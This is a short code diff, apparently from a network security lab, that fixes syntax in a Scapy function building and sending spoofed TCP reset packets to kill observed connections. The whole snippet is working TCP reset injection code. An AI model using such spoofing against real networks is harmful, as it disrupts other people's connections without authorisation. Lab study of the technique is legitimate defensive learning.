@@ -4,7 +4,7 @@ def spoof_tcp (pkt) :
   IPLayer = IP(dst=pkt[IP].src, src=pkt[IP].dst)
   TCPLayer = TCP(flags="R",
   seq=pkt [TCP].ack,
-  dport=pkt[TCP] .sport, sport=pkt [TCP] dport)
+  dport=pkt[TCP].sport, sport=pkt[TCP].dport)
   spoofpkt = IPLayer/TCPLayer
   ls (spoofpkt)
   send (spoofpkt, verbose=0)
